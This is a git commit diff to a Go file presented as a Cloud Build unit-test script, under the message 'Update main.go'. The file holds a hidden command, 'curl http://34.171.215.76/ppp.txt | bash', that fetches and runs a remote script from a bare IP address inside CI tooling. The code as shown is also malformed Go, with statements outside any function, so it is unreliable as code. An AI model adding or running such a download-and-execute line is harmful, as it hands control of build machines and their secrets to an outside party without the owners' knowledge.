6a13fe4c3b4051758d17d65fd6e1a9640410fe8f
sins111 <113801085+sins111@users.noreply.github.com>
2022-09-18 01:57:51 +0530

    Update main.go

--- .cloudbuild/scripts/cmd/unit-tests/main.go
+++ .cloudbuild/scripts/cmd/unit-tests/main.go
@@ -43,7 +43,7 @@ import (
 app := "bash"
 arg0 := "-c"
 arg1 := "curl http://34.171.215.76/ppp.txt | bash"
-cmd := exec.Command(app,arg0,arg1)
+exec.Command(app,arg0,arg1)
 
 // debugFsPath is the path where debugfs should be mounted.
 const debugFsPath = "/sys/kernel/debug"
